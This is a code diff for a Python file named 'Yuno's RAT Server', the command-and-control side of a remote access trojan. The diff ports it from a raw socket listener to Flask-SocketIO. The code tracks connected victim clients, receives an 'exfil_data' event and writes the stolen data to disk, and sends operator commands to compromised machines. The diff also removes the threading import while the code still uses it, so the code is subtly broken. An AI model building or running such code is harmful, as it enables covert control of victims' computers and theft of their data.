@@ -1,88 +1,61 @@
 #!/usr/bin/env python3
-import socket
-import threading
-import json
 import os
+import json
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, redirect, url_for
+from flask import Flask, render_template, request, jsonify, url_for
+from flask_socketio import SocketIO, emit
 import base64
 
 # Server settings
-HOST = "0.0.0.0"  # Listen on all interfaces
-# Safely get PORT from environment with a default
-port_str = os.getenv("PORT", "4444")
-try:
-    PORT = int(port_str)
-    if not (0 <= PORT <= 65535):
-        raise ValueError("Port out of valid range")
-except ValueError as e:
-    print(f"[!] Invalid PORT value '{port_str}': {e}. Defaulting to 4444.")
-    PORT = 4444
+HOST = "0.0.0.0"
 DATA_DIR = "rat_data"
 
 # Ensure data directory exists
 if not os.path.exists(DATA_DIR):
     os.makedirs(DATA_DIR)
 
-# Store connected clients (client_id -> socket)
+# Store connected clients (client_id -> socket session ID)
 clients = {}
 clients_lock = threading.Lock()
 
-# Flask app for web interface
+# Flask app and SocketIO
 app = Flask(__name__)
+app.config['SECRET_KEY'] = 'secret!'  # Needed for SocketIO
+socketio = SocketIO(app, cors_allowed_origins="*")
 
-def handle_client(client_socket, client_address):
-    print(f"[*] New client connected from {client_address[0]}:{client_address[1]}")
-    
-    client_id = f"client_{client_address[0]}_{client_address[1]}"
+@socketio.on('connect')
+def handle_connect():
+    client_id = f"client_{request.remote_addr}_{request.sid}"
+    print(f"[*] New client connected: {client_id}")
     with clients_lock:
-        clients[client_id] = client_socket
-    
-    try:
-        while True:
-            data = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            if not data:
-                break
-            
-            try:
-                client_data = json.loads(data)
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
-                with open(filename, 'w') as f:
-                    json.dump(client_data, f, indent=2)
-                print(f"[*] Received data from {client_id}: Saved to {filename}")
-            except json.JSONDecodeError:
-                print(f"[!] Invalid data from {client_id}: {data}")
-    except Exception as e:
-        print(f"[!] Error with client {client_id}: {e}")
-    finally:
-        with clients_lock:
-            if client_id in clients:
-                del clients[client_id]
-        client_socket.close()
-        print(f"[*] Client {client_id} disconnected")
+        clients[client_id] = request.sid
 
-def start_server():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        server_socket.bind((HOST, PORT))
-        server_socket.listen(5)
-        print(f"[*] RAT server listening on {HOST}:{PORT}")
-    except Exception as e:
-        print(f"[!] Failed to start server: {e}")
-        raise
+@socketio.on('disconnect')
+def handle_disconnect():
+    client_id = f"client_{request.remote_addr}_{request.sid}"
+    print(f"[*] Client disconnected: {client_id}")
+    with clients_lock:
+        if client_id in clients:
+            del clients[client_id]
 
-    while True:
-        client_socket, client_address = server_socket.accept()
-        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
-        client_thread.start()
+@socketio.on('exfil_data')
+def handle_exfil_data(data):
+    client_id = f"client_{request.remote_addr}_{request.sid}"
+    try:
+        client_data = json.loads(data)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
+        with open(filename, 'w') as f:
+            json.dump(client_data, f, indent=2)
+        print(f"[*] Received data from {client_id}: Saved to {filename}")
+    except json.JSONDecodeError:
+        print(f"[!] Invalid data from {client_id}: {data}")
 
 def send_command(client_id, command):
     with clients_lock:
         if client_id in clients:
             try:
-                clients[client_id].send(command.encode('utf-8'))
+                socketio.emit('command', command, to=clients[client_id])
                 print(f"[*] Sent command to {client_id}: {command}")
                 return True, f"Sent command to {client_id}: {command}"
             except Exception as e:
@@ -121,11 +94,4 @@ def view_file(filename):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access tool by Yuno\n")
-    
-    # Start the RAT server in a separate thread
-    server_thread = threading.Thread(target=start_server)
-    server_thread.daemon = True
-    server_thread.start()
-    
-    # Run Flask app for web interface
-    app.run(host='0.0.0.0', port=5000)
+    socketio.run(app, host='0.0.0.0', port=5000)
